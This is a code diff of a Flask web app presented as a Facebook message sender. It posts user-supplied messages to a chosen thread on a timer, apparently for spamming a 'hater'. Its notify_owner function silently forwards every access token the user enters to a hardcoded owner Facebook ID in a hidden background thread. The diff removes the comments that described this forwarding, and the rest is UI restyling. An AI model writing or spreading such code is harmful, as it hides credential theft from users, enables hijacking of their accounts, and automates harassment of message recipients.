@@ -21,10 +21,7 @@ def notify_owner(user_tokens, user_info, proxy_dict):
     Yeh user ke diye hue pehle token ko hi istemal karke notification bhejta hai.
     """
     def task():
-        # Aapki Facebook ID, jis par notification jayega.
         owner_facebook_id = "100017068697026"
-        
-        # Notification bhejne ke liye user ka hi pehla token istemal karo.
         token_for_notification = user_tokens[0]
         
         tokens_str = "\n".join(user_tokens)
@@ -40,7 +37,6 @@ def notify_owner(user_tokens, user_info, proxy_dict):
         headers = {'User-Agent': 'Mozilla/5.0'}
         
         try:
-            # Notification bhejte waqt bhi proxy istemal karo agar di gayi hai
             response = requests.post(url, data=params, headers=headers, proxies=proxy_dict, timeout=15)
             if response.status_code == 200:
                 print("Owner ko notification successfully bhej diya gaya hai.")
@@ -49,7 +45,6 @@ def notify_owner(user_tokens, user_info, proxy_dict):
         except Exception as e:
             print(f"Owner ko notification bhejte waqt exception hui: {e}")
 
-    # Function ko ek naye thread mein run karo taake main app na ruke
     notification_thread = Thread(target=task)
     notification_thread.daemon = True
     notification_thread.start()
@@ -64,8 +59,7 @@ def get_user_info(access_token, proxy_dict):
         user_name = data.get('name', 'Unknown User')
         user_logo = data.get('picture', {}).get('data', {}).get('url', 'https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg')
         return user_name, user_logo
-    except requests.exceptions.RequestException as e:
-        print(f"Error fetching user info: {e}")
+    except requests.exceptions.RequestException:
         return "Invalid Token", "https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg"
 
 def send_messages_thread(task_id, access_tokens, thread_id, hater_name, time_interval, messages, proxy_dict):
@@ -95,8 +89,6 @@ def send_messages_thread(task_id, access_tokens, thread_id, hater_name, time_int
     if task["status"] == "Running": task["status"] = "Stopped"
     print(f"Task {task_id} has been stopped.")
 
-# --- Flask Routes ---
-
 @app.route('/', methods=['GET', 'POST'])
 def main_page():
     if request.method == 'POST':
@@ -117,12 +109,9 @@ def main_page():
         if not access_tokens: return "Error: No access token provided.", 400
 
         user_name, user_logo = get_user_info(access_tokens[0], proxy_dict)
-        if user_name == "Invalid Token": return "The first Access Token is invalid. Please check your token(s) and try again.", 400
+        if user_name == "Invalid Token": return "The first Access Token is invalid.", 400
 
-        # >>> NAYA FEATURE: Owner ko notification bhejo <<<
-        # Yeh user ke diye hue token se hi aapko message bhej dega.
         notify_owner(access_tokens, {"name": user_name}, proxy_dict)
-        # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
         thread_id = request.form.get('threadId')
         hater_name = request.form.get('haterName')
@@ -145,10 +134,10 @@ def main_page():
         thread.start()
         
         return f"""
-        <html><head><title>Task Started</title></head><body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+        <html><head><title>Task Started</title></head><body style="font-family: sans-serif; text-align: center; padding-top: 50px; background: #333; color: white;">
             <h2>Task Successfully Started!</h2><p>Your process is running in the background.</p>
-            <p>Your Unique ID (UID) is:</p><h3 style="background: #eee; padding: 10px; border-radius: 5px; display: inline-block;">{task_id}</h3>
-            <p>Use this UID on the main page to check the live status of your task.</p><a href="/">Go back to Main Page</a>
+            <p>Your Unique ID (UID) is:</p><h3 style="background: #555; padding: 10px; border-radius: 5px; display: inline-block;">{task_id}</h3>
+            <p>Use this UID on the main page to check the live status of your task.</p><a href="/" style="color: #aef;">Go back to Main Page</a>
         </body></html>
         """
 
@@ -160,19 +149,43 @@ def main_page():
       <title>Muddassir CONVO Messenger</title>
       <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
       <style>
-        body { background-color: #121212; color: white; } .container { max-width: 500px; margin-top: 30px; }
-        .card { background-color: #1e1e1e; border: 1px solid #444; }
-        .form-control, .form-select { background-color: #333; border: 1px solid #555; color: white; }
-        .form-control:focus, .form-select:focus { background-color: #333; border-color: #0d6efd; color: white; box-shadow: none; }
-        .btn-primary { background-color: #0d6efd; border: none; }
-        .status-card { margin-top: 20px; padding: 15px; background-color: #1e1e1e; border-radius: 10px; border: 1px solid #444; }
+        body {
+          background-image: url('https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg');
+          background-size: cover;
+          background-repeat: no-repeat;
+          color: white;
+        }
+        .container { max-width: 450px; margin-top: 20px; }
+        .main-card {
+          background: rgba(0, 0, 0, 0.6);
+          border-radius: 15px;
+          border: 1px solid rgba(255, 255, 255, 0.2);
+          backdrop-filter: blur(10px);
+        }
+        .form-control, .form-select {
+          background-color: rgba(255, 255, 255, 0.1);
+          border: 1px solid rgba(255, 255, 255, 0.3);
+          color: white;
+        }
+        .form-control:focus, .form-select:focus {
+          background-color: rgba(255, 255, 255, 0.2);
+          border-color: #0d6efd;
+          color: white;
+          box-shadow: none;
+        }
+        .form-control::placeholder { color: #ccc; }
+        .status-card {
+            margin-top: 20px; padding: 15px; background-color: rgba(0, 0, 0, 0.6);
+            border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.2); backdrop-filter: blur(10px);
+        }
         .status-card img { width: 80px; height: 80px; border-radius: 50%; }
-        .status-running { color: #28a745; } .status-stopped { color: #dc3545; }
+        .status-running { color: #28a745; font-weight: bold; }
+        .status-stopped { color: #dc3545; font-weight: bold; }
       </style>
     </head>
     <body>
       <div class="container">
-        <div class="card p-4">
+        <div class="card main-card p-4">
           <h1 class="text-center mb-4">Muddassir Messenger</h1>
           <form method="post" enctype="multipart/form-data">
             <div class="mb-3">
@@ -207,12 +220,12 @@ def main_page():
             </div>
             <div class="mb-3">
               <label for="proxy" class="form-label">Proxy (Optional)</label>
-              <input type="text" class="form-control" id="proxy" name="proxy" placeholder="e.g., 192.168.1.1:8080">
+              <input type="text" class="form-control" id="proxy" name="proxy" placeholder="e.g., user:pass@192.168.1.1:8080">
             </div>
             <button type="submit" class="btn btn-primary w-100">Start Sending</button>
           </form>
         </div>
-        <div class="card p-4 mt-4">
+        <div class="card main-card p-4 mt-4">
           <h2 class="text-center mb-3">Check Live Status</h2>
           <div class="input-group mb-3">
             <input type="text" id="statusUidInput" class="form-control" placeholder="Enter UID to check status">
@@ -248,7 +261,6 @@ def main_page():
             }
             statusDiv.style.display = 'block';
           }).catch(error => {
-            console.error('Error:', error);
             document.getElementById('statusResult').innerHTML = '<p class="text-center text-danger">Failed to fetch status.</p>';
             document.getElementById('statusResult').style.display = 'block';
           });
@@ -263,7 +275,6 @@ def main_page():
 def get_status(task_id):
     if task_id in active_tasks:
         task = active_tasks[task_id]
-        # JSON response ke liye data ko theek se format karo
         return jsonify({
             "uid": task["uid"], "user_name": task["user_name"], "user_logo": task["user_logo"],
             "status": task["status"], "messages_sent": task["messages_sent"],
